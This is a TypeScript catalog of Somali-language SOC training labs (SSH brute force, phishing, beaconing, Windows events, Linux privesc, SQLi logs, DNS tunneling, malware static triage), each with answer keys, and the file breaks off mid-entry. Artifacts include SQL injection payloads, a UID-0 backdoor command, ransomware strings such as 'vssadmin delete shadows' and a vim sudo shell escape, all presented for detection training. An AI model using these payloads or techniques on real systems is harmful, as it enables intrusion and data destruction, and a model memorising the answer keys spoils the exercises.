export type LabQuestion = {
  id: string;
  q: string;
  options: string[];
  answer: number;
  explain: string;
};

/** A typed-command task: user types the real command syntax, checked against a pattern. */
export type CommandTask = {
  id: string;
  prompt: string;
  /** Keywords/flags that must appear in the user's typed answer (case-insensitive substring match). */
  requiredParts: string[];
  hint: string;
  /** Simulated realistic output shown after a correct/near-correct answer. */
  revealOutput: string;
  explain: string;
};

/** A real-tool workflow task: user names the tool + steps for a given piece of data. */
export type ToolTask = {
  id: string;
  toolName: string;
  prompt: string;
  expectedSteps: string[];
  revealResult: string;
  explain: string;
};

export type Lab = {
  slug: string;
  title: string;
  somali: string;
  english: string;
  level: "Bilow" | "Dhexe" | "Sare";
  minutes: number;
  scenario: string;
  objectives: string[];
  artifactTitle: string;
  artifact: string;
  questions: LabQuestion[];
  reportPrompt: string;
  /** Defaults to "quiz" when omitted — all existing labs stay unaffected. */
  taskType?: "quiz" | "command" | "tool";
  commandTasks?: CommandTask[];
  toolTasks?: ToolTask[];
};

export const labCatalog: Lab[] = [
  {
    slug: "log-analysis-ssh",
    title: "Log Analysis: SSH Brute Force",
    somali: "Falanqaynta Log-ga: Weerar SSH ah",
    english: "Log Analysis: SSH Brute Force",
    level: "Bilow",
    minutes: 25,
    scenario:
      "Server Ubuntu ah oo web hosting ah ayaa alert soo saaray habeenkii. Waxaa lagu siiyay qayb ka mid ah /var/log/auth.log. Go'aami haddii weerarku guuleystay.",
    objectives: [
      "Kala saar failed iyo accepted logins",
      "Hel IP-ga weerarayay iyo account-ka la beddelay",
      "Samee timeline UTC ah",
      "Go'aami haddii compromise dhacay",
    ],
    artifactTitle: "/var/log/auth.log (qayb)",
    artifact: `Mar 14 22:14:02 web01 sshd[2211]: Failed password for root from 45.148.10.72 port 51122 ssh2
Mar 14 22:14:05 web01 sshd[2213]: Failed password for root from 45.148.10.72 port 51130 ssh2
Mar 14 22:14:09 web01 sshd[2216]: Failed password for admin from 45.148.10.72 port 51140 ssh2
Mar 14 22:19:44 web01 sshd[2401]: Failed password for deploy from 45.148.10.72 port 52001 ssh2
Mar 14 22:19:51 web01 sshd[2404]: Accepted password for deploy from 45.148.10.72 port 52010 ssh2
Mar 14 22:20:12 web01 sudo:  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/useradd -u 0 -o svcupdate
Mar 14 22:21:03 web01 sshd[2450]: Accepted publickey for svcupdate from 45.148.10.72 port 52122 ssh2
Mar 14 22:23:40 web01 CRON[2510]: (svcupdate) CMD (/tmp/.upd/beacon.sh)`,
    questions: [
      {
        id: "q1",
        q: "Account-kee ayuu weeraryahanku ku guuleystay?",
        options: ["root", "admin", "deploy", "svcupdate"],
        answer: 2,
        explain: "'Accepted password for deploy' ayaa muujinaya guusha 22:19:51 UTC.",
      },
      {
        id: "q2",
        q: "Maxaa ka dhigaya 'useradd -u 0 -o svcupdate' arrin aad u halis ah?",
        options: [
          "Waa backup account caadi ah",
          "Waxay abuurtay isticmaale UID 0 leh — root kale (backdoor)",
          "Waxay tirtirtay users-ka",
          "Waa update nidaam",
        ],
        answer: 1,
        explain: "UID 0 = root. Kani waa persistence/privilege escalation.",
      },
      {
        id: "q3",
        q: "Cron job-ka /tmp/.upd/beacon.sh wuxuu tilmaamayaa?",
        options: ["Backup", "Persistence iyo C2 beaconing", "Log rotation", "Patch"],
        answer: 1,
        explain: "Script qarsoon /tmp ku jira oo si joogto ah socda = persistence + C2.",
      },
      {
        id: "q4",
        q: "Tallaabada ugu horreysa ee containment?",
        options: [
          "Dib u shid server-ka",
          "Go'doomi host-ka, xir accounts-ka deploy iyo svcupdate, block IP-ga",
          "Tirtir auth.log",
          "Sug ilaa subax",
        ],
        answer: 1,
        explain: "Go'doomi + xir accounts + block IOC, iyadoo caddaymaha la ilaalinayo.",
      },
    ],
    reportPrompt:
      "Qor warbixin gaaban: timeline UTC, account-yada saameeyay, IOCs (IP, file, user), iyo 3 talo.",
  },
  {
    slug: "phishing-investigation",
    title: "Phishing Investigation",
    somali: "Baaritaanka Email Phishing",
    english: "Phishing Investigation",
    level: "Bilow",
    minutes: 25,
    scenario:
      "Shaqaale ayaa email soo gudbiyay isaga oo su'aal ka qabo. Falanqee header-yada iyo link-ka, kadibna go'aami.",
    objectives: [
      "Falanqee sender iyo Return-Path",
      "Fasir natiijooyinka SPF/DKIM/DMARC",
      "Hel domain-ka dhabta ah ee link-ga",
      "Qor go'aan iyo tallaabooyin",
    ],
    artifactTitle: "Email headers & body",
    artifact: `From: "Salaam Bank Support" <support@salaam-bank.so>
Return-Path: <bounce@mail-delivery-247.top>
Authentication-Results: spf=fail (sender IP is 91.213.8.44) dkim=none dmarc=fail
Received: from mail-delivery-247.top (91.213.8.44) by mx.company.so; Mar 20 08:12:04 +0000
Subject: URGENT: Account-kaaga waa la xiraya 24 saac gudahood
Reply-To: verify@mail-delivery-247.top

Dear Customer,
Waxaan ogaannay dhaqdhaqaaq shaki leh. Fadlan xaqiiji account-kaaga isla markiiba:
https://salaam-bank.so.verify-login.top/session?id=8813
Haddii kale account-kaagu wuu xirmayaa.`,
    questions: [
      {
        id: "q1",
        q: "Waa kee domain-ka dhabta ah ee link-ga?",
        options: ["salaam-bank.so", "verify-login.top", "session", "company.so"],
        answer: 1,
        explain: "Domain-ka dhabta ah waa verify-login.top; salaam-bank.so waa subdomain khiyaano ah.",
      },
      {
        id: "q2",
        q: "'spf=fail dkim=none dmarc=fail' macnaheedu waa?",
        options: [
          "Email-ku wuu hubaal yahay",
          "Sender-ku ma xaqiijin karo — calaamad spoofing ah",
          "Server-ku wuu jaban yahay",
          "Wax macno ah ma leh",
        ],
        answer: 1,
        explain: "Saddexdaas oo dhan guuldarraystay waa spoofing indicator xoog leh.",
      },
      {
        id: "q3",
        q: "Waa maxay tallaabada saxda ah ee link-ka?",
        options: [
          "Guji si aad u hubiso",
          "Ha gujin — falanqee URLScan/VirusTotal ama VM go'doonsan",
          "U dir asxaabtaada",
          "Ku qor browser-ka telefoonkaaga",
        ],
        answer: 1,
        explain: "Waligaa ha gujin link phishing ah host shaqada ah.",
      },
      {
        id: "q4",
        q: "Talooyinka ugu muhiimsan kadib xaqiijinta?",
        options: [
          "Block sender/domain, ka saar mailboxes-ka, hubi cidda gujisay, reset passwords haddii loo baahdo",
          "Iska tirtir email-ka keliya",
          "Ka digniin qofka soo diray",
          "Wax lama sameeyo",
        ],
        answer: 0,
        explain: "Containment: block, purge, hubi clicks, reset credentials.",
      },
    ],
    reportPrompt:
      "Qor triage note: sender, indicators, domain-ka dhabta ah, cidda saameysay, iyo tallaabooyinka.",
  },
  {
    slug: "suspicious-ip",
    title: "Suspicious IP Investigation",
    somali: "Baaritaanka IP Shaki leh",
    english: "Suspicious IP Investigation",
    level: "Dhexe",
    minutes: 30,
    scenario:
      "Firewall-ku wuxuu muujinayaa in workstation gudaha ah si joogto ah ula xiriirto IP dibadeed. Go'aami haddii tani tahay C2 beaconing.",
    objectives: [
      "Ogaado qaabka beaconing-ka",
      "Enrich IP-ga (reputation, ASN, dal)",
      "Qiimee data exfiltration",
      "Talo bixi containment",
    ],
    artifactTitle: "Firewall connection log",
    artifact: `time(UTC)  src_ip        dst_ip         dst_port  bytes_out  bytes_in
09:00:12   10.20.4.55    185.234.72.19  443       1120       340
09:05:13   10.20.4.55    185.234.72.19  443       1108       352
09:10:12   10.20.4.55    185.234.72.19  443       1131       344
09:15:14   10.20.4.55    185.234.72.19  443       1119       351
09:20:12   10.20.4.55    185.234.72.19  443       1124       349
09:41:55   10.20.4.55    185.234.72.19  443       48211904   512
09:42:10   10.20.4.55    52.96.10.4     443       8210       19340`,
    questions: [
      {
        id: "q1",
        q: "Maxaa ugu muujinaya beaconing xogtan?",
        options: [
          "Port 443 la isticmaalay",
          "Xiriir 5 daqiiqo kasta oo isku eg oo cabbir la mid ah",
          "IP-ga waa mid dibadeed",
          "Bytes_in yar",
        ],
        answer: 1,
        explain: "Waqti joogto ah (interval) + cabbir isku mid = calaamad C2 caadi ah.",
      },
      {
        id: "q2",
        q: "Sadarka 09:41:55 (48 MB oo baxaya) wuxuu tilmaamayaa?",
        options: ["Update Windows", "Data exfiltration suurtogal ah", "Backup caadi ah", "DNS query"],
        answer: 1,
        explain: "Upload weyn oo ku socda C2 = exfiltration — kordhi mudnaanta.",
      },
      {
        id: "q3",
        q: "Enrichment-kee ayaa ugu waxtar badan?",
        options: [
          "Reputation (AbuseIPDB/VirusTotal), ASN/hosting, WHOIS iyo threat intel",
          "Cabbirka disk-ka host-ka",
          "Nooca browser-ka",
          "Qaddarka RAM",
        ],
        answer: 0,
        explain: "IP enrichment waxay caddaysaa haddii uu la xiriiro C2 la yaqaan.",
      },
      {
        id: "q4",
        q: "Containment habboon?",
        options: [
          "Block IP-ga, go'doomi host-ka 10.20.4.55, qaado memory image, escalate Tier 2",
          "Dami firewall-ka",
          "Ka codso isticmaalaha inuu dib u shido",
          "Sug 48 saac",
        ],
        answer: 0,
        explain: "Block + isolate + ilaali caddaymaha + escalate.",
      },
    ],
    reportPrompt:
      "Qor warbixin: qaabka beaconing, waqtiga exfiltration, IOCs, iyo talooyinka containment.",
  },
  {
    slug: "incident-report-lab",
    title: "Incident Report Writing",
    somali: "Qorista Warbixinta Dhacdada",
    english: "Incident Report Writing",
    level: "Dhexe",
    minutes: 35,
    scenario:
      "Account maamule ayaa la waayay (compromised) iyadoo phishing loo isticmaalay. Waxaa lagu siiyay xaqiiqooyinka. Qor warbixin xirfadeed.",
    objectives: [
      "Samee timeline UTC",
      "Sharax root cause",
      "Qiimee scope iyo impact",
      "Qor talooyin owner iyo waqti leh",
    ],
    artifactTitle: "Xaqiiqooyinka la ururiyay",
    artifact: `08:12 UTC  Email phishing ah ayaa la gaarsiiyay 14 mailbox
08:31 UTC  Isticmaalaha a.hassan wuxuu gujiyay link-ga oo geliyay credentials
08:34 UTC  Login guulaystay Microsoft 365 min IP 91.213.8.44 (Netherlands)
08:36 UTC  Rule mailbox cusub: dhammaan emails-ka leh "invoice" loo diray folder RSS
09:02 UTC  17 email BEC ah loo diray macaamiisha, lacag wareejin lagu dalbanayo
09:40 UTC  SOC ayaa alert helay (impossible travel) oo bilaabay baaritaan
09:55 UTC  Session-nada la xiray, password la beddelay, MFA la shiday`,
    questions: [
      {
        id: "q1",
        q: "Root cause-ka waa?",
        options: [
          "Firewall oo qaldan",
          "Credential phishing oo aan MFA lahayn account maamule",
          "Malware USB ah",
          "Server oo duugoobay",
        ],
        answer: 1,
        explain: "Link phishing + credentials + MFA la'aan ayaa keenay compromise-ka.",
      },
      {
        id: "q2",
        q: "Mailbox rule-ka cusub ujeeddadiisu waxay ahayd?",
        options: [
          "Nidaamin email-ka",
          "Qarinta jawaabaha si BEC-gu aan la ogaan",
          "Kordhinta xawaaraha",
          "Backup",
        ],
        answer: 1,
        explain: "Rules-ka qarinta waa qaab caan ah oo BEC ah (defense evasion).",
      },
      {
        id: "q3",
        q: "Impact-ka ugu weyn?",
        options: [
          "Khasaare maaliyadeed macaamiisha iyo sumcad, xog la helay",
          "Disk oo buuxsamay",
          "Internet oo gaabis ah",
          "Printer oo shaqo diiday",
        ],
        answer: 0,
        explain: "17 email BEC ah oo macaamiisha loo diray = khatar lacag iyo sumcad.",
      },
      {
        id: "q4",
        q: "Talada ugu mudnaanta sarreysa?",
        options: [
          "MFA khasab ah dhammaan accounts-ka (owner: IT Manager, 14 maalmood)",
          "Beddel logo-ga shirkadda",
          "Iibso server cusub",
          "Ka joogso email-ka",
        ],
        answer: 0,
        explain: "MFA ayaa si toos ah joojinaysa root cause-ka.",
      },
    ],
    reportPrompt:
      "Qor warbixin buuxda: executive summary, timeline, scope/impact, root cause, IOCs, tallaabooyin, iyo 3 talo owner+waqti leh.",
  },
  {
    slug: "windows-event-log-triage",
    title: "Windows Event Log Triage",
    somali: "Falanqaynta Windows Event Logs",
    english: "Windows Event Log Triage",
    level: "Dhexe",
    minutes: 30,
    scenario:
      "SOC-ga waxaa loo gudbiyay export ka mid ah Windows Security Event Log server-ka HR-DC01 (Domain Controller). Falanqee oo go'aami haddii privilege escalation dhacay.",
    objectives: [
      "Aqoonso Event IDs muhiimka ah (4624, 4625, 4720, 4672, 1102)",
      "Samee timeline UTC ah oo login iyo user changes ah",
      "Go'aami haddii privilege escalation la xaqiijiyay",
      "Aqoonso calaamadaha attacker uu tirtiray evidence",
    ],
    artifactTitle: "Windows Security Event Log (qayb, export)",
    artifact: `Time (UTC)  EventID  Account       Details
02:14:01    4625     administrator Failed logon, Source: 178.62.4.91
02:14:04    4625     administrator Failed logon, Source: 178.62.4.91
02:14:07    4625     administrator Failed logon, Source: 178.62.4.91
...(212 failed attempts total, 02:10-02:31)...
02:31:44    4624     administrator Logon Type 3 (Network), Source: 178.62.4.91
02:33:10    4720     administrator New user account created: svc_backup01
02:33:52    4732     administrator svc_backup01 added to local group Administrators
02:34:15    4672     svc_backup01  Special privileges assigned to new logon
02:41:09    1102     administrator The audit log was cleared`,
    questions: [
      {
        id: "q1",
        q: "212 x Event 4625 oo ay ku xigto hal 4624 waa calaamad?",
        options: [
          "Backup guulaystay",
          "Brute force ka guuleystay account-ka administrator",
          "Update nidaam",
          "Caadi — user ilaaway password",
        ],
        answer: 1,
        explain: "Isku dayo badan oo guuldarraystay oo ku xigta hal guul waa brute force success.",
      },
      {
        id: "q2",
        q: "Event 4720 iyo 4732 isku xigxiga waxay muujinayaan?",
        options: [
          "User cusub oo si toos ah loogu daray group-ka Administrators — privilege escalation",
          "Backup process caadi ah",
          "Antivirus update",
          "Password policy change",
        ],
        answer: 0,
        explain: "Account cusub oo isla markiiba admin laga dhigo waa red flag weyn.",
      },
      {
        id: "q3",
        q: "Event 1102 (audit log cleared) 02:41:09 wuxuu tilmaamayaa?",
        options: [
          "Log rotation caadi ah",
          "Attacker-ku wuxuu isku dayayaa inuu qariyo evidence",
          "Backup server-ka",
          "System patch",
        ],
        answer: 1,
        explain: "Log clearing kadib account creation waa calaamad caan ah oo anti-forensics ah.",
      },
      {
        id: "q4",
        q: "Tallaabada ugu degdegsan ee containment?",
        options: [
          "Xir svc_backup01, dib u celi group membership-ka, beddel administrator password, escalate IR",
          "Sug maalinta xigta",
          "Tirtir Event Viewer",
          "Iska dhaaf, waa caadi",
        ],
        answer: 0,
        explain: "Account-ka la abuuray waa in la xiro isla markiiba, awoodda la qaado, oo la escalate gareeyo.",
      },
    ],
    reportPrompt:
      "Qor warbixin: timeline Event IDs-ka, go'aanka privilege escalation, IOCs (account cusub, source IP), iyo talooyin containment/eradication.",
  },
  {
    slug: "linux-privesc-hunt",
    title: "Linux Privilege Escalation Hunt",
    somali: "Raadinta Privilege Escalation Linux",
    english: "Linux Privilege Escalation Hunt",
    level: "Dhexe",
    minutes: 30,
    scenario:
      "Waxaad haysataa shell access user caadi ah oo leh Linux server. Waa inaad baarto meelaha privilege escalation suurtagalka ah, adigoo isticmaalaya output-ka amarrada hoose.",
    objectives: [
      "Falanqee SUID binaries la helay",
      "Falanqee sudo -l output",
      "Aqoonso misconfiguration ugu halista badan",
      "Sharax sida awoodda root loo heli lahaa",
    ],
    artifactTitle: "Command output (find + sudo -l)",
    artifact: `$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/nmap
/usr/bin/su

$ sudo -l
Matching Defaults entries for webapp on this host:
    env_reset, mail_badpass

User webapp may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/systemctl restart nginx`,
    questions: [
      {
        id: "q1",
        q: "Kee ka mid ah SUID binaries-ka la helay ayaa aan caadi ahayn oo la yaabo?",
        options: ["/usr/bin/passwd", "/usr/bin/nmap", "/usr/bin/mount", "/usr/bin/su"],
        answer: 1,
        explain: "nmap oo SUID leh waa aan caadi ahayn — waxaa la isticmaali karaa privilege escalation (interactive mode).",
      },
      {
        id: "q2",
        q: "sudo -l output-ka, 'NOPASSWD: /usr/bin/vim' wuxuu u oggolaadaa user-ka?",
        options: [
          "Inuu kaliya files uu leeyahay furo",
          "Inuu ka bixi karo shell root ah (vim wuxuu bixiyaa :!sh)",
          "Wax kasta ma sameyn karo",
          "Inuu kaliya files akhriyo",
        ],
        answer: 1,
        explain: "Editors sida vim/nano oo sudo NOPASSWD ah waxay u ogolaadaan escape shell root ah.",
      },
      {
        id: "q3",
        q: "Misconfiguration-ka ugu halista badan ee liiskan waa?",
        options: [
          "/usr/bin/passwd SUID",
          "sudo NOPASSWD: /usr/bin/vim",
          "/usr/bin/mount SUID",
          "mail_badpass setting",
        ],
        answer: 1,
        explain: "vim editor access root ahaan waa mid la isticmaali karo si fudud oo la helo root shell.",
      },
      {
        id: "q4",
        q: "Talo lagu xaliyo vim NOPASSWD-ka?",
        options: [
          "Ka saar vim liiska sudoers, kaliya siin amarro xaddidan oo aan awood shell lahayn",
          "Wax lama beddelo",
          "Tirtir user-ka webapp",
          "Kordhi awoodda webapp",
        ],
        answer: 0,
        explain: "Least privilege — amarro editors ah oo sudo NOPASSWD ah waa in laga fogaado.",
      },
    ],
    reportPrompt:
      "Qor warbixin: SUID binaries shaki leh, sudo misconfigurations, sida privilege escalation loo fulin lahaa (concept ahaan), iyo talooyin xalinta.",
  },
  {
    slug: "web-log-sql-injection",
    title: "Web Log: SQL Injection Detection",
    somali: "Log-ga Web-ka: Ogaanshaha SQL Injection",
    english: "Web Log: SQL Injection Detection",
    level: "Dhexe",
    minutes: 30,
    scenario:
      "Web application firewall (WAF) alert ma jirin, laakiin access log-ga server-ka wuxuu muujinayaa requests la yaab leh. Falanqee oo go'aami haddii SQL injection la isku dayay.",
    objectives: [
      "Aqoonso payloads SQLi ah URL-ka gudihiisa",
      "Kala saar attempts guuldarraystay iyo kuwa laga yaabo inay guuleysteen",
      "Falanqee status codes-ka response-ka",
      "Talo bixi remediation",
    ],
    artifactTitle: "Apache access.log (qayb)",
    artifact: `10.0.0.5 - - [22/Mar/2026:14:02:11] "GET /product?id=17 HTTP/1.1" 200 4021
203.0.113.44 - - [22/Mar/2026:14:05:33] "GET /product?id=17' OR '1'='1 HTTP/1.1" 200 8842
203.0.113.44 - - [22/Mar/2026:14:05:41] "GET /product?id=17' UNION SELECT username,password FROM users-- HTTP/1.1" 200 9104
203.0.113.44 - - [22/Mar/2026:14:05:58] "GET /product?id=17' AND SLEEP(5)-- HTTP/1.1" 200 4033
203.0.113.44 - - [22/Mar/2026:14:06:20] "GET /product?id=17; DROP TABLE users-- HTTP/1.1" 500 612`,
    questions: [
      {
        id: "q1",
        q: "Request-ka 14:05:41 (UNION SELECT username,password) wuxuu isku dayayaa inuu?",
        options: [
          "Cusbooneysiiyo product-ka",
          "Soo saaro xog database kale (users table) — union-based SQLi",
          "Sameeyo backup",
          "Xiro website-ka",
        ],
        answer: 1,
        explain: "UNION SELECT waa hab caan ah oo lagu soo saaro xog jadwal kale.",
      },
      {
        id: "q2",
        q: "AND SLEEP(5)-- payload-ku waa tusaale?",
        options: [
          "Union-based SQLi",
          "Time-based blind SQLi",
          "Error-based SQLi",
          "Ma aha SQLi tusaale ah",
        ],
        answer: 1,
        explain: "SLEEP() waxaa loo isticmaalaa in la ogaado condition marka aan results toos ah la arki karin.",
      },
      {
        id: "q3",
        q: "Status code 500 sadarka ugu dambeeya wuxuu muujin karaa?",
        options: [
          "Guul dhammaystiran",
          "Server error, laga yaabo query-gii uu jabiyay database-ka (partial success indicator)",
          "Website-ka wuu shaqeynayaa si caadi ah",
          "Caching issue",
        ],
        answer: 1,
        explain: "500 error kadib payload SQLi ah waxay muujisaa in query-gu gaadhay database-ka isagoo jabiyay syntax-ka.",
      },
      {
        id: "q4",
        q: "Talada ugu muhiimsan xalinta?",
        options: [
          "Hirgeli parameterized queries/prepared statements, WAF rules, oo la baaro database logs si loo hubiyo xog aan la helin",
          "Kaliya xir IP-ga 203.0.113.44",
          "Iska dhaaf, 500 waa guuldarro attacker-ka",
          "Beddel URL-ka product page-ka",
        ],
        answer: 0,
        explain: "Root cause-ku waa code-level vulnerability — waa in la hirgeliyo parameterized queries.",
      },
    ],
    reportPrompt:
      "Qor warbixin: payloads la helay, nooca SQLi kasta, go'aanka haddii xog la xaday, iyo talooyin remediation (parameterized queries).",
  },
  {
    slug: "nmap-scan-risk-triage",
    title: "Nmap Scan: Risk Triage",
    somali: "Nmap Scan: Kala Hormarinta Khatarta",
    english: "Nmap Scan: Risk Triage",
    level: "Bilow",
    minutes: 25,
    scenario:
      "Waxaad samaysay authorized network scan subnet shirkad ah. Falanqee natiijada Nmap oo kala hormari ports-ka iyadoo lagu saleynayo khatarta.",
    objectives: [
      "Aqoonso ports/services khatar sare leh",
      "Kala saar services caadi ah iyo kuwa aan caadi ahayn",
      "Talo bixi mudnaanta remediation",
      "Sharax sababta port kasta uu khatar u yahay",
    ],
    artifactTitle: "Nmap scan output (host 10.10.5.22)",
    artifact: `Nmap scan report for 10.10.5.22
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          vsftpd 2.3.4 (anonymous login allowed)
22/tcp   open  ssh          OpenSSH 8.9
23/tcp   open  telnet       Linux telnetd
80/tcp   open  http         Apache 2.4.52
443/tcp  open  https        Apache 2.4.52
445/tcp  open  microsoft-ds Samba 4.6.2
3389/tcp open  ms-wbt-server Microsoft Terminal Services`,
    questions: [
      {
        id: "q1",
        q: "Kee ka mid ah services-kan ayaa ugu khatarta badan haddii uu internet-ka u furan yahay?",
        options: ["80/tcp HTTP", "22/tcp SSH", "23/tcp Telnet", "443/tcp HTTPS"],
        answer: 2,
        explain: "Telnet waa protocol aan encrypted ahayn — credentials-ku waxay u socdaan si cad (plain text).",
      },
      {
        id: "q2",
        q: "21/tcp FTP oo 'anonymous login allowed' leh wuxuu u oggolaadaa?",
        options: [
          "Kaliya admin inuu geli karo",
          "Qof kasta inuu galo aan credentials loo baahnayn",
          "Wax kasta uma oggola geli",
          "Ma jiro faa'iido gaar ah"
        ],
        answer: 1,
        explain: "Anonymous FTP access waa misconfiguration caan ah oo files exposed ka dhigi karta.",
      },
      {
        id: "q3",
        q: "3389/tcp (RDP) internet-ka u furan waa khatar sababtoo ah?",
        options: [
          "Ma jiro khatar, waa caadi",
          "Waa target caan ah oo brute force iyo known exploits leh",
          "Wuxuu keliya u shaqeeyaa gudaha",
          "Ma isticmaalo authentication",
        ],
        answer: 1,
        explain: "RDP oo internet-ka u furan waa mid ka mid ah services-ka ugu badan ee la weeraro.",
      },
      {
        id: "q4",
        q: "Talada ugu mudnaanta sarreysa (Critical) ee host-kan?",
        options: [
          "Xir/damiye Telnet iyo FTP anonymous, xaddid RDP VPN+MFA gudaheeda, patch Samba version",
          "Kaliya beddel wallpaper-ka server-ka",
          "Kordhi RAM-ka server-ka",
          "Wax lama beddelo, dhammaan waa caadi",
        ],
        answer: 0,
        explain: "Protocols aan encrypted ahayn iyo anonymous access waa in la xiraa/la xaddidaa isla markiiba.",
      },
    ],
    reportPrompt:
      "Qor warbixin: liiska ports/services khatarta leh, severity rating mid kasta, iyo talooyin remediation kala hormaray.",
  },
  {
    slug: "dns-tunneling-detection",
    title: "DNS Tunneling Detection",
    somali: "Ogaanshaha DNS Tunneling",
    english: "DNS Tunneling Detection",
    level: "Sare",
    minutes: 35,
    scenario:
      "SIEM-ku wuxuu muujinayaa qadar aad u badan oo DNS queries ah oo ka socda host hal ah, domain isku mid ah. Falanqee oo go'aami haddii DNS tunneling (data exfiltration) dhacayo.",
    objectives: [
      "Aqoonso pattern-ka DNS queries shaki leh",
      "Falanqee record types la isticmaalay",
      "Xisaabi qadarka xogta laga yaabo in la xaday",
      "Talo bixi detection iyo containment",
    ],
    artifactTitle: "DNS query log (qayb, 10 daqiiqo gudahood)",
    artifact: `time(UTC)  src_ip       query                                          type  bytes
10:02:01   10.5.2.18    a8f3e991c2.exfil-c2.net                       TXT   512
10:02:03   10.5.2.18    b91c4e02aa.exfil-c2.net                       TXT   498
10:02:05   10.5.2.18    c02fe8d1bb.exfil-c2.net                       TXT   505
10:02:07   10.5.2.18    d4471aefcc.exfil-c2.net                       TXT   511
...(340+ subdomain queries isla domain-ka, isla format-ka, 10:00-10:14)...
10:14:22   10.5.2.18    z9f0e2b1cd.exfil-c2.net                       TXT   488`,
    questions: [
      {
        id: "q1",
        q: "Maxaa ka dhigaya queries-kan calaamad DNS tunneling ah?",
        options: [
          "Waxay isticmaalaan port 53",
          "Subdomains random ah (hex-like) oo si degdeg ah loo weydiiyo isla domain-ka, record type TXT",
          "Waa DNS caadi ah",
          "Waxay isticmaalaan HTTPS",
        ],
        answer: 1,
        explain: "Subdomains random-looking ah oo joogto ah isla domain-ka waa signature caan ah oo DNS tunneling ah.",
      },
      {
        id: "q2",
        q: "Sababta TXT record type loo isticmaalo DNS tunneling waa?",
        options: [
          "TXT records waxay qaadi karaan xog badan marka la barbardhigo A records",
          "TXT waa mid ka fudud in la scan gareeyo",
          "TXT waa mid keliya loo isticmaalo SPF",
          "Ma jiro sabab gaar ah",
        ],
        answer: 0,
        explain: "TXT records waxay u oggolaadaan xog dherer ah, taasoo ka dhigaysa mid ku habboon data encoding.",
      },
      {
        id: "q3",
        q: "340+ queries 14 daqiiqo gudahood oo 500 bytes qiyaastii ah mid kasta wuxuu muujinayaa?",
        options: [
          "DNS caching normal ah",
          "Exfiltration joogto ah oo qadar macquul ah oo xog ah la xaday",
          "Backup DNS",
          "Update software",
        ],
        answer: 1,
        explain: "Xisaabinta bytes badan oo isku dhufan waxay muujisaa xog la xaday si tartiib ah, DNS-ka lagu qariyay.",
      },
      {
        id: "q4",
        q: "Talada ugu wanaagsan ee la ogaado/la xannibo DNS tunneling mustaqbalka?",
        options: [
          "Block/monitor domain-ka, hubi DNS query volume anomalies, isticmaal DNS filtering/threat intel feeds",
          "Xir DNS oo dhan network-ka",
          "Iska dhaaf, DNS marwalba waa caadi",
          "Kaliya kordhi bandwidth-ka",
        ],
        answer: 0,
        explain: "DNS monitoring iyo filtering waa xalka caadiga ah ee detection/prevention DNS tunneling.",
      },
    ],
    reportPrompt:
      "Qor warbixin: pattern-ka la ogaaday, qadarka xogta suurtagalka ah in la xaday, IOCs (domain, src IP), iyo talooyin detection/containment.",
  },
  {
    slug: "malware-static-triage",
    title: "Malware Static Triage",
    somali: "Falanqaynta Static ee Malware",
    english: "Malware Static Triage",
    level: "Sare",
    minutes: 30,
    scenario:
      "Endpoint-ka finance-ka waxaa laga helay file shaki leh oo la soo dejiyay email attachment ka dib. Falanqee macluumaadka static ah (aan la fulinayn) oo go'aami haddii uu yahay malware.",
    objectives: [
      "Falanqee file hash iyo VirusTotal-style detection ratio",
      "Aqoonso strings shaki leh oo file-ka ku jira",
      "Fasir metadata-ka file-ka",
      "Go'aami haddii file-ku yahay malicious",
    ],
    artifactTitle: "Static analysis summary (VirusTotal-style + strings excerpt)",
    artifact: `File: invoice_march_2026.pdf.exe
SHA256: 8f4e2a1c9b7d3e0f6a5c8b2d1e9f7a4c3b6d8e0f2a1c9b7d3e0f6a5c8b2d1e9f
File size: 412 KB
VirusTotal detections: 41/68 engines flagged malicious
File type (actual): PE32 executable (not PDF, despite .pdf.exe extension)

Strings output (excerpt):
  cmd.exe /c powershell -enc JABzAD0ATgBlAHcALQBPAGIA...
  \\C2SERVER\\share\\update.bin
  vssadmin delete shadows /all /quiet
  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
  Global\\{8F2A1C9B-3E7D-4F6A-9C8B-2D1E9F7A4C3B}`,
    questions: [
      {
        id: "q1",
        q: "Sababta 'invoice_march_2026.pdf.exe' loo tixgeliyo shaki leh waa?",
        options: [
          "Double extension (.pdf.exe) waa hab caan ah oo lagu qariyo executables",
          "Magaca file-ka waa mid caadi ah",
          "Waa PDF dhab ah",
          "Cabbirka file-ku waa mid yar",
        ],
        answer: 0,
        explain: "Double extensions waxaa loo isticmaalaa in la marin habaabiyo users-ka inay u maleeyaan document caadi ah.",
      },
      {
        id: "q2",
        q: "41/68 VirusTotal detection ratio wuxuu muujinayaa?",
        options: [
          "File-ku waa 100% ammaan ah",
          "Antivirus engines badan ayaa u aqoonsaday file-ka malicious",
          "File-ku aan la baarin",
          "Ma jiro macno gaar ah",
        ],
        answer: 1,
        explain: "Boqolkiiba badan oo engines ah oo isku raacsan waa calaamad xoog leh oo malicious ah.",
      },
      {
        id: "q3",
        q: "'vssadmin delete shadows' string-ka ku jira file-ka wuxuu tilmaamayaa?",
        options: [
          "Backup software caadi ah",
          "Ransomware behavior — tirtirida shadow copies si dib-u-celin loo joojiyo",
          "Antivirus update",
          "System diagnostic tool",
        ],
        answer: 1,
        explain: "Tirtirida shadow copies waa tallaabo caan ah oo ransomware ka mid ah ka hor encryption.",
      },
      {
        id: "q4",
        q: "Registry Run key (HKCU...Run) ku jirta strings-ka wuxuu muujinayaa?",
        options: [
          "Persistence — malware wuxuu isku dayayaa inuu ugu sii jiro system-ka",
          "Uninstall process",
          "System backup",
          "Antivirus scan",
        ],
        answer: 0,
        explain: "Run keys waa meel caan ah oo persistence lagu sameeyo Windows.",
      },
    ],
    reportPrompt:
      "Qor warbixin: go'aanka malicious/benign, IOCs (hash, C2 reference, registry key), calaamadaha ransomware, iyo talooyin containment/eradication.",
  },
  {
    slug: "burp-suite-idor-analysis",
    title: "Burp Suite: IDOR Discovery",
    somali: "Burp Suite: Ogaanshaha IDOR",
    english: "Burp Suite: IDOR Discovery",
    level: "Dhexe",
    minutes: 30,
    scenario:
      "Waxaad authorized web app pentest ku samaynaysaa. Burp Proxy-gaaga waxaa lagu intercept-gareeyay request oo la xiriira invoice user-ka. Falanqee requests/responses-ka oo go'aami haddii IDOR jirto.",
    objectives: [
